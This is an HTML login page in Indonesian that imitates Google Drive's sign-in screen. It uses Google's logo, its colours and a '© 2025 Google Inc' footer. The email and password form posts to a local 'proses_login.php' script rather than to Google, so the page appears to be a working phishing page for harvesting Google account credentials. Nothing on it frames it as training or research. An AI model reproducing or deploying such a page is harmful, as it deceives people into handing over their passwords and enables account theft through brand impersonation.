<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Login - Google Drive</title>
  <style>
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #202124;
    }

    .login-container {
      width: 90%;
      max-width: 400px;
      padding: 30px;
      box-shadow: 0 1px 6px rgba(32,33,36,0.28);
      border-radius: 8px;
      text-align: center;
    }

    .login-container img {
      width: 75px;
      margin-bottom: 20px;
    }

    h2 {
      font-weight: normal;
      font-size: 22px;
      margin-bottom: 8px;
    }

    .input-group {
      margin-top: 20px;
      text-align: left;
    }

    .input-group label {
      font-size: 14px;
      color: #5f6368;
    }

    .input-group input {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      transition: border 0.2s;
    }

    .input-group input:focus {
      border-color: #1a73e8;
    }

    .submit-btn {
      width: 100%;
      margin-top: 30px;
      background: #1a73e8;
      color: white;
      padding: 12px;
      border: none;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    .submit-btn:hover {
      background: #1669c1;
    }

    .bottom-text {
      margin-top: 20px;
      font-size: 12px;
      color: #5f6368;
    }

  </style>
</head>
<body>

  <div class="login-container">
    <img src="https://ssl.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png" alt="Google Drive">
    <h2>Login ke Drive</h2>
    <form method="POST" action="proses_login.php">
      <div class="input-group">
        <label>Email</label>
        <input type="email" name="email" required>
      </div>
      <div class="input-group">
        <label>Password</label>
        <input type="password" name="password" required>
      </div>
      <button type="submit" class="submit-btn">Berikutnya</button>
    </form>
    <div class="bottom-text">© 2025 Google Inc</div>
  </div>

</body>
</html>